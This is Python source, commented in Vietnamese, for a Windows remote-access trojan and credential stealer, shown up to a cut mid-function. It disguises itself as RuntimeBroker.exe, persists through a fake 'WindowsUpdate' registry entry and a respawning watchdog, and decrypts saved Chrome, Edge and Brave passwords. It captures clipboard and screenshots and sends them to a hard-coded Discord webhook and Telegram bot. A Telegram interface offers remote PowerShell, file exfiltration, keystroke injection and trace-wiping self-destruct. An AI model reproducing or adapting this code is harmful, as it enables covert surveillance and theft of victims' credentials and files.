import psutil
import time
import requests
import json
import os
import socket
import platform
import logging
import re
import hashlib
import base64
import threading
import sys
import winreg
import sqlite3
import shutil
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
from pathlib import Path
from pynput import keyboard
import win32gui
import win32process
import win32clipboard
import win32con
import win32crypt
import win32api
import mss
from PIL import Image
from cryptography.fernet import Fernet
try:
    from Crypto.Cipher import AES
    AES_AVAILABLE = True
except ImportError:
    AES_AVAILABLE = False

# ==================== CẤU HÌNH ====================
CONFIG = {
    "discord_webhook": "https://discord.com/api/webhooks/1489246380999573665/mMBZkTa2fBi3Pji8YEvER1w7KxhKhbWY5-RT0Z4CZb75IupI5APUBsTvAA0xwVNAv4iI",
    "monitor_interval": 20,
    "log_dir": os.path.dirname(os.path.abspath(__file__)),
    "log_password": "123456789",
    "max_log_size_mb": 100,
    "monitored_apps": ["chrome.exe", "msedge.exe", "zalo.exe"],
    "excluded_apps": ["oq", "fg", "jh"],
    "company_name": "CÔNG TY CỦA BẠN",
    "enable_keylogging": True,
    "key_buffer_size": 500,

    "control_port": 6789,
    "relay_url": "",
    "relay_poll_interval": 2,

    "enable_clipboard": True,
    "enable_file_tracker": True,
    "steal_passwords": True,
    "steal_wifi": True,
    "steal_history": True,

    # Tên giả trong Task Manager
    "fake_name": "RuntimeBroker.exe",

    # Telegram Bot
    "telegram_token": "7751725882:AAECOg5Ve_FDq-OGtD05B_7rVeakO07HqSc",
    "telegram_allowed_ids": [7124717990],

    "screenshot_quality": 85,
    "screenshot_interval": 30,
    "max_screenshots_per_hour": 240,
}

# ==================== KHỞI TẠO ====================
def get_cipher_key(password):
    pwd_hash = hashlib.sha256(password.encode()).digest()
    return base64.urlsafe_b64encode(pwd_hash)

cipher = Fernet(get_cipher_key(CONFIG["log_password"]))

class EncryptedFileHandler(logging.FileHandler):
    def emit(self, record):
        try:
            msg = self.format(record)
            encrypted_msg = cipher.encrypt(msg.encode() + b'\n')
            with open(self.baseFilename, 'ab') as f:
                f.write(encrypted_msg + b'\n---ENCRYPTED_LOG_SEPARATOR---\n')
        except Exception:
            self.handleError(record)

log_file    = os.path.join(CONFIG["log_dir"], f"{socket.gethostname()}_monitor.log")
keylog_file = os.path.join(CONFIG["log_dir"], f"{socket.gethostname()}_keylog.log")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        EncryptedFileHandler(log_file, encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

COMPUTER_NAME = socket.gethostname()
OS_NAME       = platform.system() + " " + platform.release()

shutdown_flag  = False
screenshot_mode = False

# ==================== WATCHDOG ====================
PID_FILE    = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".agw_main.pid")
WD_PID_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".agw_wd.pid")
STOP_FLAG   = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".agw_stop")

def _write_pid(path, pid=None):
    with open(path, "w") as f:
        f.write(str(pid or os.getpid()))

def _read_pid(path):
    try:
        with open(path) as f:
            return int(f.read().strip())
    except Exception:
        return None

def _is_alive(pid):
    try:
        return psutil.pid_exists(pid) and psutil.Process(pid).status() != psutil.STATUS_ZOMBIE
    except Exception:
        return False

def _spawn_main():
    proc = subprocess.Popen(
        [sys.executable, os.path.abspath(__file__)],
        creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
    )
    _write_pid(PID_FILE, proc.pid)
    return proc.pid

def _spawn_watchdog():
    python = sys.executable.replace("python.exe", "pythonw.exe")
    if not os.path.exists(python):
        python = sys.executable
    proc = subprocess.Popen(
        [python, os.path.abspath(__file__), "--watchdog"],
        creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
    )
    _write_pid(WD_PID_FILE, proc.pid)
    return proc.pid

def watchdog_mode():
    """Theo dõi PID chính, tự động restart nếu bị kill"""
    _write_pid(WD_PID_FILE)
    wd_log = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".agw_wd.log")

    while True:
        time.sleep(5)
        if os.path.exists(STOP_FLAG):
            with open(wd_log, "a") as f:
                f.write(f"[{datetime.now()}] Stop flag detected, exiting.\n")
            break
        main_pid = _read_pid(PID_FILE)
        if main_pid is None or not _is_alive(main_pid):
            time.sleep(2)
            if os.path.exists(STOP_FLAG):
                break
            try:
                new_pid = _spawn_main()
                with open(wd_log, "a") as f:
                    f.write(f"[{datetime.now()}] Restarted main (old={main_pid}, new={new_pid})\n")
            except Exception as e:
                with open(wd_log, "a") as f:
                    f.write(f"[{datetime.now()}] Restart failed: {e}\n")

def _watchdog_keepalive_thread():
    """Canh watchdog còn sống, spawn lại nếu không"""
    while True:
        time.sleep(15)
        wd_pid = _read_pid(WD_PID_FILE)
        if wd_pid is None or not _is_alive(wd_pid):
            try:
                _spawn_watchdog()
                logger.info("Watchdog đã được khởi động lại")
            except Exception as e:
                logger.debug(f"Không thể spawn watchdog: {e}")

# ==================== SELF-DESTRUCT ====================
def self_destruct():
    """Xóa sạch mọi dấu vết: registry, log, file cài đặt"""
    fake_name    = CONFIG.get("fake_name", "RuntimeBroker.exe")
    appdata_dir  = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows"
    installed_exe = appdata_dir / fake_name
    if not getattr(sys, "frozen", False):
        installed_exe = appdata_dir / fake_name.replace(".exe", ".py")

    steps = []

    # 1. Gỡ registry
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, "WindowsUpdate")
        winreg.CloseKey(key)
        steps.append("✅ Đã gỡ registry startup")
    except Exception as e:
        steps.append(f"⚠️ Registry: {e}")

    # 2. Xóa log
    try:
        log_dir = CONFIG.get("log_dir", "")
        if log_dir and os.path.isdir(log_dir):
            for f in os.listdir(log_dir):
                fp = os.path.join(log_dir, f)
                if os.path.isfile(fp):
                    try:
                        os.remove(fp)
                    except Exception:
                        pass
        steps.append("✅ Đã xóa log")
    except Exception as e:
        steps.append(f"⚠️ Log: {e}")

    # 3. Xóa pid files, tạo STOP_FLAG
    for pf in [PID_FILE, WD_PID_FILE, STOP_FLAG]:
        try:
            if os.path.exists(pf):
                os.remove(pf)
        except Exception:
            pass
    try:
        with open(STOP_FLAG, "w") as f:
            f.write("selfdestruct")
    except Exception:
        pass
    steps.append("✅ Đã dừng watchdog")

    # 4. Xóa file exe/py sau khi thoát
    target = str(installed_exe) if installed_exe.exists() else \
             os.path.abspath(sys.executable if getattr(sys, "frozen", False) else __file__)
    try:
        subprocess.Popen(
            f'cmd /c timeout /t 3 /nobreak >nul && del /f /q "{target}"',
            shell=True, creationflags=0x08000000
        )
        steps.append(f"✅ Đã lên lịch xóa: {os.path.basename(target)}")
    except Exception as e:
        steps.append(f"⚠️ Xóa file: {e}")

    return "\n".join(steps)

# ==================== CÀI ĐẶT & ẨN ====================
def install_self():
    """Copy vào AppData với tên giả"""
    fake_name  = CONFIG.get("fake_name", "RuntimeBroker.exe")
    target_dir = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows"
    target_dir.mkdir(parents=True, exist_ok=True)

    if getattr(sys, "frozen", False):
        current_exe = Path(sys.executable)
        target_path = target_dir / fake_name
    else:
        current_exe = Path(os.path.abspath(__file__))
        fake_name   = fake_name.replace(".exe", ".py")
        target_path = target_dir / fake_name

    try:
        if current_exe.resolve() == target_path.resolve():
            logger.info(f"Đã chạy từ vị trí cài đặt: {target_path}")
            return str(target_path)
        shutil.copy2(str(current_exe), str(target_path))
        logger.info(f"✅ Đã cài vào: {target_path}")
        send_to_discord(f"📦 Đã cài đặt tại `{target_path}`", level="startup")
        return str(target_path)
    except Exception as e:
        logger.warning(f"Không thể cài đặt: {e}")
        return None

def add_to_startup(exe_path=None):
    """Thêm vào registry để tự chạy khi máy bật"""
    try:
        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, sub_key, 0, winreg.KEY_SET_VALUE)

        if exe_path and os.path.exists(exe_path):
            if exe_path.endswith(".exe"):
                cmd = f'"{exe_path}"'
            else:
                python_exe = sys.executable.replace("python.exe", "pythonw.exe")
                if not os.path.exists(python_exe):
                    python_exe = sys.executable
                cmd = f'"{python_exe}" "{exe_path}"'
        else:
            script_path = os.path.abspath(__file__)
            python_exe  = sys.executable.replace("python.exe", "pythonw.exe")
            if not os.path.exists(python_exe):
                python_exe = sys.executable
            cmd = f'"{python_exe}" "{script_path}"'

        winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(reg_key)
        logger.info(f"✅ Đã thêm vào Startup Registry: {cmd}")
        send_to_discord("🚀 Đã thiết lập **tự động chạy khi khởi động**", level="startup")
    except Exception as e:
        logger.warning(f"Không thêm được startup: {e}")

def hide_console():
    """Ẩn cửa sổ console"""
    try:
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, 0)
    except Exception:
        pass

# ==================== DISCORD + TELEGRAM ====================
def send_to_discord(message, level="info"):
    emoji    = {"info": "ℹ️", "warning": "⚠️", "alert": "🚨", "startup": "🟢", "shutdown": "⛔"}.get(level, "📌")
    full_msg = f"{emoji} *[{COMPUTER_NAME}]* {message}"

    if CONFIG["discord_webhook"] and "YOUR_WEBHOOK" not in CONFIG["discord_webhook"]:
        try:
            requests.post(CONFIG["discord_webhook"], json={
                "content": full_msg.replace("*", "**"),
                "username": f"Giám sát {CONFIG['company_name']}"
            }, timeout=10)
        except Exception:
            pass

    tg_broadcast(full_msg)

def tg_send(token, chat_id, text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"},
            timeout=10
        )
    except Exception as e:
        logger.debug(f"Telegram send error: {e}")

def tg_send_photo(token, chat_id, photo_path, caption=""):
    try:
        with open(photo_path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{token}/sendPhoto",
                data={"chat_id": chat_id, "caption": caption},
                files={"photo": f},
                timeout=20
            )
    except Exception as e:
        logger.debug(f"Telegram send photo error: {e}")

def tg_send_document(token, chat_id, file_path, caption=""):
    try:
        with open(file_path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{token}/sendDocument",
                data={"chat_id": chat_id, "caption": caption},
                files={"document": (os.path.basename(file_path), f)},
                timeout=60
            )
    except Exception as e:
        logger.debug(f"Telegram send document error: {e}")

def tg_broadcast(text):
    token = CONFIG.get("telegram_token", "").strip()
    ids   = CONFIG.get("telegram_allowed_ids", [])
    if not token or not ids:
        return
    for cid in ids:
        tg_send(token, cid, text)

def tg_broadcast_photo(photo_path, caption=""):
    token = CONFIG.get("telegram_token", "").strip()
    ids   = CONFIG.get("telegram_allowed_ids", [])
    if not token or not ids:
        return
    for cid in ids:
        tg_send_photo(token, cid, photo_path, caption)

# ==================== CHỤP MÀN HÌNH ====================
def take_screenshot():
    """Chụp và gửi về cả Discord + Telegram"""
    try:
        with mss.mss() as sct:
            shot = sct.grab(sct.monitors[1])
            img  = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
            temp = os.path.join(CONFIG["log_dir"], f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
            img.save(temp, quality=CONFIG["screenshot_quality"])

        caption = f"📸 {COMPUTER_NAME} — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

        if CONFIG["discord_webhook"] and "YOUR_WEBHOOK" not in CONFIG["discord_webhook"]:
            with open(temp, "rb") as f:
                requests.post(CONFIG["discord_webhook"],
                              data={"content": f"**{caption}**"},
                              files={"file": (os.path.basename(temp), f, "image/jpeg")},
                              timeout=15)

        tg_broadcast_photo(temp, caption)
        os.remove(temp)
        logger.info("Screenshot đã gửi (Discord + Telegram)")
        return True
    except Exception as e:
        logger.error(f"Screenshot error: {e}")
        return False

def take_screenshot_telegram(token, chat_id):
    """Chụp màn hình và gửi thẳng về 1 chat_id cụ thể"""
    try:
        with mss.mss() as sct:
            shot = sct.grab(sct.monitors[1])
            img  = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
            temp = os.path.join(CONFIG["log_dir"], f"tg_shot_{datetime.now().strftime('%H%M%S')}.jpg")
            img.save(temp, quality=CONFIG["screenshot_quality"])
        tg_send_photo(token, chat_id, temp,
                      caption=f"📸 {COMPUTER_NAME} — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        os.remove(temp)
    except Exception as e:
        tg_send(token, chat_id, f"❌ Lỗi chụp màn hình: {e}")

def continuous_screenshot_thread():
    global screenshot_mode
    count = 0
    while True:
        if screenshot_mode:
            take_screenshot()
            count += 1
            if count >= CONFIG["max_screenshots_per_hour"]:
                screenshot_mode = False
                send_to_discord("⚠️ Đã đạt giới hạn screenshot/giờ, tự động tắt", level="warning")
        time.sleep(CONFIG["screenshot_interval"])

# ==================== TELEGRAM BOT ====================
def telegram_thread():
    global shutdown_flag, screenshot_mode

    token = CONFIG.get("telegram_token", "").strip()
    if not token:
        logger.info("Telegram token chưa cấu hình, bỏ qua.")
        return

    allowed = CONFIG.get("telegram_allowed_ids", [])
    offset  = 0
    TG      = f"https://api.telegram.org/bot{token}"

    HELP = (
        "🎮 *AGW Remote Control*\n"
        f"🖥 Máy: `{COMPUTER_NAME}`\n\n"
        "📡 *Điều khiển:*\n"
        "/status — Trạng thái hiện tại\n"
        "/screenshot — Chụp màn hình ngay\n"
        "/screenshot\\_start — Chụp mỗi 30 giây\n"
        "/screenshot\\_stop — Dừng chụp\n"
        "/shutdown — Tắt chương trình\n"
        "/lock — Khóa màn hình Windows\n\n"
        "🔍 *Thu thập dữ liệu:*\n"
        "/passwords — Lấy mật khẩu Chrome/Edge/Brave\n"
        "/credman — Lấy mật khẩu Windows Credential Manager\n"
        "/wifi — Lấy mật khẩu WiFi đã lưu\n"
        "/history — Lấy lịch sử duyệt web\n"
        "/clipboard — Nội dung clipboard hiện tại\n"
        "/download <đường dẫn> — Gửi file về Telegram\n"
        "/shell <lệnh> — Chạy lệnh CMD từ xa\n"
        "/type <text> — Gõ text vào máy đích\n"
        "/open <path/url> — Mở file hoặc URL\n\n"
        "⚠️ *Nguy hiểm:*\n"
        "/selfdestruct confirm — Xóa sạch mọi dấu vết và tự hủy\n\n"
        "/help — Xem lại danh sách lệnh"
    )

    try:
        me       = requests.get(f"{TG}/getMe", timeout=10).json()
        bot_name = me.get("result", {}).get("username", "bot")
        logger.info(f"✅ Telegram bot: @{bot_name} (token: ...{token[-6:]})")
    except Exception:
        pass

    while True:
        try:
            resp    = requests.get(f"{TG}/getUpdates",
                                   params={"offset": offset, "timeout": 30, "allowed_updates": ["message"]},
                                   timeout=35)
            updates = resp.json().get("result", [])
        except Exception as e:
            logger.debug(f"Telegram poll error: {e}")
            time.sleep(5)
            continue

        for upd in updates:
            offset  = upd["update_id"] + 1
            msg     = upd.get("message", {})
            chat_id = msg.get("chat", {}).get("id")
            text    = msg.get("text", "").strip()

            if not chat_id or not text:
                continue

            if allowed and chat_id not in allowed:
                tg_send(token, chat_id, f"⛔ Không có quyền.\nChat ID của bạn: `{chat_id}`")
                continue

            logger.info(f"Telegram lệnh từ {chat_id}: '{text}'")
            cmd = text.lower().lstrip("/").replace(" ", "_")

            if cmd in ("help", "start"):
                tg_send(token, chat_id, HELP)

            elif cmd == "status":
                tg_send(token, chat_id,
                        f"💓 *Trạng thái*\n"
                        f"🖥 Máy: `{COMPUTER_NAME}`\n"
                        f"🪟 OS: `{OS_NAME}`\n"
                        f"📸 Screenshot liên tục: `{'ON' if screenshot_mode else 'OFF'}`\n"
                        f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

            elif cmd == "screenshot":
                tg_send(token, chat_id, "📸 Đang chụp màn hình...")
                threading.Thread(target=take_screenshot_telegram, args=(token, chat_id), daemon=True).start()

            elif cmd == "screenshot_start":
                screenshot_mode = True
                tg_send(token, chat_id, "🎥 Chụp liên tục đã *BẬT* (mỗi 30 giây)")

            elif cmd == "screenshot_stop":
                screenshot_mode = False
                tg_send(token, chat_id, "⏹ Chụp liên tục đã *TẮT*")

            elif cmd == "shutdown":
                tg_send(token, chat_id, "🛑 Đang tắt chương trình...")
                shutdown_flag = True

            elif cmd == "lock":
                try:
                    import ctypes
                    ctypes.windll.user32.LockWorkStation()
                    tg_send(token, chat_id, "🔒 Đã khóa màn hình")
                except Exception as e:
                    tg_send(token, chat_id, f"❌ Lỗi lock: {e}")

            elif cmd == "passwords":
                tg_send(token, chat_id, "🔑 Đang lấy mật khẩu trình duyệt...")
                threading.Thread(target=steal_browser_passwords, daemon=True).start()

            elif cmd == "credman":
                tg_send(token, chat_id, "🗝 Đang lấy Windows Credential Manager...")
                threading.Thread(target=get_credential_manager, daemon=True).start()

            elif cmd == "wifi":
                tg_send(token, chat_id, "📶 Đang lấy mật khẩu WiFi...")
                threading.Thread(target=get_wifi_passwords, daemon=True).start()

            elif cmd == "history":
                tg_send(token, chat_id, "🌐 Đang lấy lịch sử duyệt web...")
                threading.Thread(target=get_browser_history, daemon=True).start()

            elif cmd == "clipboard":
                try:
                    win32clipboard.OpenClipboard()
                    try:
                        data = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
                    except Exception:
                        data = "(Clipboard trống hoặc không phải text)"
                    finally:
                        win32clipboard.CloseClipboard()
                    tg_send(token, chat_id, f"📋 *Clipboard hiện tại:*\n`{data[:3000]}`")
                except Exception as e:
                    tg_send(token, chat_id, f"❌ Lỗi đọc clipboard: {e}")

            elif cmd == "selfdestruct":
                tg_send(token, chat_id,
                        "⚠️ *CẢNH BÁO*\n"
                        "Lệnh này sẽ:\n"
                        "• Gỡ registry startup\n"
                        "• Xóa toàn bộ log\n"
                        "• Xóa file cài đặt\n"
                        "• Tắt chương trình vĩnh viễn\n\n"
                        "Gõ `/selfdestruct confirm` để xác nhận.")

            elif cmd == "selfdestruct_confirm":
                tg_send(token, chat_id, "💣 Bắt đầu tự hủy...")
                def _do_destruct(cid=chat_id):
                    report = self_destruct()
                    tg_send(token, cid, f"🗑 *Kết quả:*\n{report}\n\n_Chương trình sẽ tắt ngay bây giờ._")
                    time.sleep(2)
                    global shutdown_flag
                    shutdown_flag = True
                threading.Thread(target=_do_destruct, daemon=True).start()

            elif text.lower().startswith("/download "):
                file_arg = text[len("/download "):].strip()
                def _send_file(fp=file_arg, cid=chat_id):
                    if not os.path.exists(fp):
                        tg_send(token, cid, f"❌ File không tồn tại:\n`{fp}`")
                        return
                    size = os.path.getsize(fp)
                    if size > 50 * 1024 * 1024:
                        tg_send(token, cid, f"❌ File quá lớn ({size // (1024*1024)} MB). Giới hạn là 50 MB.")
                        return
                    tg_send(token, cid, f"📤 Đang gửi `{os.path.basename(fp)}` ({size // 1024} KB)...")
                    tg_send_document(token, cid, fp,
                                     caption=f"📁 {os.path.basename(fp)}\n📏 {size // 1024} KB\n🖥 {COMPUTER_NAME}")
                threading.Thread(target=_send_file, daemon=True).start()

            elif text.lower().startswith("/shell "):
                shell_cmd = text[len("/shell "):].strip()
                def _run_shell(c=shell_cmd, cid=chat_id):
                    try:
                        result = subprocess.run(
                            ["powershell", "-NoProfile", "-Command", c],
                            capture_output=True,
                            text=True, encoding="utf-8", errors="ignore", timeout=30
                        )
                        output = (result.stdout + result.stderr).strip()
                        if not output:
                            output = "(Không có output)"
                        tg_send(token, cid, f"💻 `{c}`\n```{output[:3500]}```")
                    except subprocess.TimeoutExpired:
                        tg_send(token, cid, f"⏱ Lệnh timeout sau 30 giây: `{c}`")
                    except Exception as e:
                        tg_send(token, cid, f"❌ Lỗi: {e}")
                threading.Thread(target=_run_shell, daemon=True).start()

            elif text.lower().startswith("/type "):
                type_text = text[len("/type "):].strip()
                def _do_type(t=type_text, cid=chat_id):
                    try:
                        # Lưu clipboard cũ
                        win32clipboard.OpenClipboard()
                        try:
                            old_clip = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
                        except Exception:
                            old_clip = None
                        win32clipboard.CloseClipboard()

                        # Đặt text vào clipboard
                        win32clipboard.OpenClipboard()
                        win32clipboard.EmptyClipboard()
                        win32clipboard.SetClipboardData(win32con.CF_UNICODETEXT, t)
                        win32clipboard.CloseClipboard()

                        # Ctrl+V để paste
                        time.sleep(0.2)
                        win32api.keybd_event(0x11, 0, 0, 0)          # Ctrl down
                        win32api.keybd_event(0x56, 0, 0, 0)          # V down
                        win32api.keybd_event(0x56, 0, win32con.KEYEVENTF_KEYUP, 0)  # V up
                        win32api.keybd_event(0x11, 0, win32con.KEYEVENTF_KEYUP, 0)  # Ctrl up
                        time.sleep(0.3)

                        # Khôi phục clipboard cũ
                        if old_clip is not None:
                            win32clipboard.OpenClipboard()
                            win32clipboard.EmptyClipboard()
                            win32clipboard.SetClipboardData(win32con.CF_UNICODETEXT, old_clip)
                            win32clipboard.CloseClipboard()

                        tg_send(token, cid, f"⌨️ Đã gõ: `{t}`")
                    except Exception as e:
                        tg_send(token, cid, f"❌ Lỗi type: {e}")
                threading.Thread(target=_do_type, daemon=True).start()

            elif text.lower().startswith("/open "):
                open_arg = text[len("/open "):].strip()
                def _do_open(arg=open_arg, cid=chat_id):
                    try:
                        os.startfile(arg)
                        tg_send(token, cid, f"✅ Đã mở: `{arg}`")
                    except Exception as e:
                        tg_send(token, cid, f"❌ Lỗi open: {e}")
                threading.Thread(target=_do_open, daemon=True).start()

            else:
                tg_send(token, chat_id, f"❓ Lệnh `{text}` không hợp lệ.\nGõ /help để xem danh sách lệnh.")

# ==================== EMBEDDED HTTP SERVER (LAN) ====================
def execute_command(cmd):
    global shutdown_flag, screenshot_mode
    cmd = cmd.strip().lower()
    logger.info(f"🔔 Lệnh từ dashboard: '{cmd}'")

    if cmd == "shutdown":
        shutdown_flag = True
        send_to_discord("🛑 **LỆNH TẮT TỪ XA**", level="alert")
        return {"status": "ok", "message": "Shutdown initiated"}
    elif cmd == "screenshot":
        threading.Thread(target=take_screenshot, daemon=True).start()
        return {"status": "ok", "message": "Screenshot taken"}
    elif cmd == "screenshot_every_30s":
        screenshot_mode = True
        send_to_discord("📸 Chụp liên tục đã BẬT", level="info")
        return {"status": "ok", "message": "Continuous screenshot ON"}
    elif cmd == "screenshot_stop":
        screenshot_mode = False
        send_to_discord("📸 Chụp liên tục đã TẮT", level="info")
        return {"status": "ok", "message": "Continuous screenshot OFF"}
    elif cmd == "status":
        return {
            "status": "ok",
            "computer": COMPUTER_NAME,
            "os": OS_NAME,
            "screenshot_mode": screenshot_mode,
            "shutdown_flag": shutdown_flag,
        }
    else:
        return {"status": "error", "message": f"Unknown command: '{cmd}'"}

class DashboardHandler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')

    def send_json(self, data, code=200):
        body = json.dumps(data, ensure_ascii=False).encode('utf-8')
        self.send_response(code)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.send_header('Content-Length', len(body))
        self._cors()
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(200)
        self._cors()
        self.end_headers()

    def do_GET(self):
        if self.path == '/status':
            self.send_json({
                "online": True,
                "computer": COMPUTER_NAME,
                "os": OS_NAME,
                "screenshot_mode": screenshot_mode,
                "shutdown_flag": shutdown_flag,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
        else:
            self.send_json({"error": "Not found"}, 404)

    def do_POST(self):
        if self.path == '/command':
            length = int(self.headers.get('Content-Length', 0))
            raw    = self.rfile.read(length)
            try:
                data = json.loads(raw.decode('utf-8'))
                cmd  = str(data.get('command', '')).strip()
            except Exception:
                self.send_json({"status": "error", "message": "Invalid JSON"}, 400)
                return
            self.send_json(execute_command(cmd))
        else:
            self.send_json({"error": "Not found"}, 404)

    def log_message(self, format, *args):
        pass

def start_control_server():
    port = CONFIG["control_port"]
    try:
        server = HTTPServer(('0.0.0.0', port), DashboardHandler)
        logger.info(f"✅ LAN control server: http://localhost:{port}")
        server.serve_forever()
    except Exception as e:
        logger.error(f"Control server lỗi: {e}")

# ==================== RELAY POLL (REMOTE) ====================
def relay_poll_thread():
    relay = CONFIG.get("relay_url", "").rstrip("/")
    if not relay:
        logger.info("Relay URL không cấu hình, bỏ qua chế độ remote.")
        return

    logger.info(f"✅ Remote mode: poll relay {relay} mỗi {CONFIG['relay_poll_interval']}s")
    send_to_discord(f"🌐 **Remote mode**: kết nối relay `{relay}`", level="startup")
    prev_cmd = None
    headers  = {"Cache-Control": "no-cache", "Pragma": "no-cache"}

    while True:
        try:
            resp = requests.get(f"{relay}/command.txt", headers=headers, timeout=8)
            if resp.status_code == 200:
                cmd = resp.text.strip().lower()
                if cmd and cmd != prev_cmd:
                    logger.info(f"🔔 Lệnh từ relay: '{cmd}'")
                    execute_command(cmd)
                    prev_cmd = cmd
                    try:
                        requests.post(f"{relay}/api/ack", json={"acked": cmd}, timeout=5)
                    except Exception:
                        pass
                elif not cmd:
                    prev_cmd = None
        except Exception as e:
            logger.debug(f"Relay poll error: {e}")
        time.sleep(CONFIG["relay_poll_interval"])

# ==================== THU THẬP DỮ LIỆU ====================

# ── 1. CLIPBOARD ────────────────────────────────────────────
def clipboard_monitor_thread():
    if not CONFIG.get("enable_clipboard", True):
        return
    prev = ""
    logger.info("Clipboard monitor started")
    while True:
        try:
            win32clipboard.OpenClipboard()
            try:
                data = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
            except Exception:
                data = ""
            finally:
                win32clipboard.CloseClipboard()

            if data and data.strip() and data != prev:
                prev    = data
                snippet = data[:2000]
                tg_broadcast(f"📋 *Clipboard* — `{COMPUTER_NAME}`\n"
                             f"🕐 {datetime.now().strftime('%H:%M:%S')}\n`{snippet}`")
                if CONFIG["discord_webhook"] and "YOUR_WEBHOOK" not in CONFIG["discord_webhook"]:
                    embed = {
                        "title": "📋 CLIPBOARD",
                        "color": 0xf0a500,
                        "fields": [
                            {"name": "🕐 Thời gian", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": True},
                            {"name": "📏 Độ dài",    "value": f"{len(data)} ký tự",                         "inline": True},
                            {"name": "📝 Nội dung",  "value": snippet,                                       "inline": False},
                        ]
                    }
                    try:
                        requests.post(CONFIG["discord_webhook"],
                                      json={"embeds": [embed], "username": f"Bot - {CONFIG['company_name']}"},
                                      timeout=10)
                    except Exception:
                        pass
        except Exception:
            pass
        time.sleep(1.5)

# ── 2. BROWSER PASSWORDS ────────────────────────────────────
def _decrypt_chrome_password(key, encrypted_pw):
    if not encrypted_pw:
        return ""
    prefix = encrypted_pw[:3]
    if prefix == b'v10':
        try:
            if AES_AVAILABLE:
                iv      = encrypted_pw[3:15]
                payload = encrypted_pw[15:]
                c       = AES.new(key, AES.MODE_GCM, iv)
                return c.decrypt(payload)[:-16].decode(errors="ignore")
        except Exception:
            pass
    if prefix == b'v20':
        return ""  # App-Bound Encryption — không hỗ trợ
    try:
        return win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1].decode(errors="ignore")
    except Exception:
        return ""

def _get_chrome_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            ls = json.load(f)
        enc_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    except Exception:
        return None

def steal_browser_passwords():
    browsers = {
        "Chrome": Path(os.environ.get("LOCALAPPDATA", "")) / "Google/Chrome/User Data",
        "Edge":   Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft/Edge/User Data",
        "Brave":  Path(os.environ.get("LOCALAPPDATA", "")) / "BraveSoftware/Brave-Browser/User Data",
    }
    all_results = []

    for browser, base_path in browsers.items():
        local_state = base_path / "Local State"
        if not local_state.exists():
            logger.info(f"[PW] {browser}: không tìm thấy Local State tại {base_path}")
            continue
        key = _get_chrome_key(str(local_state))
        if not key:
            logger.info(f"[PW] {browser}: không lấy được master key")
            continue

        profile_dirs = [base_path / "Default"]
        for item in base_path.iterdir():
            if item.is_dir() and item.name.startswith("Profile"):
                profile_dirs.append(item)

        for profile_dir in profile_dirs:
            login_db = profile_dir / "Login Data"
            if not login_db.exists():
                logger.info(f"[PW] {browser}/{profile_dir.name}: không có Login Data")
                continue
            tmp = str(Path(CONFIG["log_dir"]) / f"_tmp_pw_{browser}_{profile_dir.name}.db")
            try:
                shutil.copy2(str(login_db), tmp)
                conn = sqlite3.connect(tmp)
                rows = conn.execute(
                    "SELECT origin_url, username_value, password_value FROM logins"
                ).fetchall()
                conn.close()
            except Exception as e:
                logger.info(f"[PW] {browser}/{profile_dir.name}: lỗi đọc DB — {e}")
                continue
            finally:
                try: os.remove(tmp)
                except Exception: pass

            v10_count = v20_count = old_count = 0
            for url, user, enc_pw in rows:
                if enc_pw:
                    prefix = enc_pw[:3]
                    if prefix == b'v10': v10_count += 1
                    elif prefix == b'v20': v20_count += 1
                    else: old_count += 1
                pw = _decrypt_chrome_password(key, enc_pw)
                if user or pw:
                    all_results.append({
                        "browser": f"{browser}/{profile_dir.name}",
                        "url": url, "user": user, "password": pw
                    })
            logger.info(f"{browser}/{profile_dir.name}: {len(rows)} mục — v10={v10_count} v20={v20_count} cũ={old_count}")

    if not all_results:
        return

    # Discord
    for chunk in [all_results[i:i+10] for i in range(0, len(all_results), 10)]:
